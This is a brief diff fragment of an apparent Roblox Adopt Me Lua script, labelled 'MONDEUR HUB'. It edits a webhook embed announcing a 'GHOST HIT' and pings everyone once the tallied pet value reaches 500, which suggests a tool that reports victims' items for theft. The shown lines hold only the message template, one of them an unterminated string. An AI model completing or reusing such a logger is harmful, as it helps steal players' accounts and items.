@@ -167,4 +167,4 @@ if #sortedPets > 0 then
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
             title = "MONDEUR HUB | 🦊 GHOST HIT!",
-            description = "
+            description = "This is my script for Adopt Me!"
